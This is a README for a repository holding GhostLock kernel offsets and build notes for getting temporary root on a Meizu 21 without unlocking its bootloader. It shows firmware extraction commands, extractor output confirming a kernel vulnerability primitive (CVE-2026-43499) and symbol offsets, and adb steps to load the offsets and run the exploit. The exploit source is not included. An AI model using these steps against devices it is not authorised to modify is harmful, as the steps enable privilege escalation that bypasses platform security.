# Meizu 21 KernelSU JailBreak Notes

[English](README.md) | [中文](README_ZH.md)

This repository keeps the GhostLock offset package and build notes used to get temporary root on Meizu 21 without unlocking the bootloader.

## Device

- Model: MEIZU 21
- Device: meizu21
- SoC: Qualcomm SM8650
- Android: 14
- Build fingerprint: `meizu/meizu_21_CN/meizu21:14/UKQ1.230917.001/1733904967:user/release-keys`
- Build incremental: `1733904967`
- Kernel release: `6.1.79-android14-11-maybe-dirty`
- Active slot during extraction: `_a`
- OTA package observed: Flyme 11.2.1.0A

## Files

- `offsets/offsets-meizu21.json`
  - Import this file in GhostLock with `Import offsets.json`.
- `release/GhostLock-release.apk`
  - APK used for the test run.
- `ghostlock-kernel-table/6.1.79-android14-11-maybe-dirty/offsets.h`
  - Native table generated by `ghostlock-extract --register`; useful if rebuilding GhostLock with built-in support.
- `tools/windows/ghostlock-extract.exe`
  - Windows build of the GhostLock extractor used for this device.
- `SHA256SUMS.txt`
  - Hashes for the retained files and the source images used during extraction.

Large firmware artifacts are intentionally not committed. The local analysis used `boot.img` and `xbl_config.img` extracted from the matching OTA payload.

## What Was Done

The matching OTA contained `payload.bin` with the required partitions:

- `boot`
- `init_boot`
- `vendor_boot`
- `xbl_config`

The images were extracted with `payload-dumper-go`:

```powershell
.\payload-dumper-go.exe -p boot,init_boot,vendor_boot,xbl_config -o .\extracted .\payload.bin
```

Then the GhostLock extractor was built from YuKongA/ghostlock-app on Windows using a portable Rust and MinGW setup. The offset JSON was generated from `boot.img` plus `xbl_config.img`:

```powershell
.\tools\extract_rs\target\release\ghostlock-extract.exe `
  <firmware-workdir>\extracted\boot.img `
  --xbl-config <firmware-workdir>\extracted\xbl_config.img `
  --format json `
  --out <firmware-workdir>\offsets-meizu21.json
```

The extractor recovered kallsyms and BTF from the image, then checked the vulnerable primitive before writing offsets. The important extractor result was:

```text
info: kallsyms layout pre-6.4 recovered (96641 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0xf8d8d4 still uses current)
info: pselect chain __arm64_sys_pselect6->core_sys_select ... shift=1
info: nf_logger loggers=0x1e82968 nfulnl_logger=0x1e82a28 ulog=1 slot=0x1e82970
info: sizeof(mm_struct)=0x3C0 (MM_STRUCT_SZ=0x500 in src/core/common.h)
```

The generated JSON has:

```text
release: 6.1.79-android14-11-maybe-dirty
compact_waiter: 1
pselect_waiter_shift: 1
kernel_phys_load: 0xa8000000
```

The table was also registered into a local GhostLock checkout:

```powershell
.\tools\extract_rs\target\release\ghostlock-extract.exe `
  <firmware-workdir>\extracted\boot.img `
  --xbl-config <firmware-workdir>\extracted\xbl_config.img `
  --register
```

## Usage

Check that the phone is still on the exact same kernel:

```powershell
adb shell uname -r
```

Expected:

```text
6.1.79-android14-11-maybe-dirty
```

Push the offset file to the phone:

```powershell
adb push .\offsets\offsets-meizu21.json /sdcard/Download/offsets-meizu21.json
```

Open GhostLock, import `offsets-meizu21.json`, then run the exploit from the app. This is for the temporary-root/GhostLock route; it does not require flashing `boot.img` or unlocking the bootloader.

## Notes

The extractor printed this warning:

```text
warning: waiter fits at the last usable word (shift=3); wake_state falls outside the copied fd_set and relies on the kernel zero-initialising it
```

In practice the Meizu 21 test reported working root, but race-style temporary root can still require several attempts depending on system load and timing.
